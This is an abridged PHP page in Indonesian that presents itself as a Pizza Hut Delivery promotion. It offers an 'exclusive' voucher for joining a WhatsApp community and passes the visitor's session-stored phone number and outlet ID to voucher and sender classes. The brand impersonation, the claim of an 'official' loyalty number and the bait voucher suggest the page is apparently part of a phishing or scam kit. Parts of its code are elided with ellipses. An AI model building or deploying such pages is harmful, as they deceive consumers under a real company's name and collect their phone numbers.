<?php 
session_start();
if(empty($_SESSION['phd'])){
    header("Location: Welcome");
    exit;
}
require_once('../function/function.php');
if (isset($_POST['send'])) {
    if (empty($_SESSION['phone']) || empty($_SESSION['idoutlet'])) {
        echo 'Invalid parameters';
        exit;
    }
    $voucherHandler = new VoucherHandler();
    $voucherHandler->generateVoucher($_SESSION['phone'], $_SESSION['idoutlet']);

    // Create an instance of the sender class
    $senderInstance = new sender($_SESSION['phone'], $_SESSION['idoutlet']);
...
<body>
    ...
    <div class="main">
        ...
        <div class="title">
            <span style="font-weight: 700;">Nomor belum terdaftar dikomunitas</span>
        </div>
        <div class="action">
            Voucher ini EKSKLUSIF untuk member komunitas whatsapp Pizzahut Delivery
            <form method="POST" style="margin-top: 10px;">
                <button type="submit" name="send" class="btn">Join Komunitas <i class="bi bi-whatsapp"></i></button>
            </form>
        </div>
    </div>
    <footer>
        <div class="info">
            <p>Setelah join Komunitas WhatsApp Pizza hut Delivery, kami akan mengirimkan voucher ke nomor kamu.<br>Proses ini memerlukan beberapa jam karena tingginya antusiasme.<br>Kamu akan menerima notifikasi melalui WhatsApp dari nomor resmi "Pizzahut Delivery Loyalty" saat voucher berhasil terkirim. Voucher berlaku 7 hari setelah kamu join komunitas Pizza hut Delivery.</p>
        </div>
    </footer>
</body>
</html>
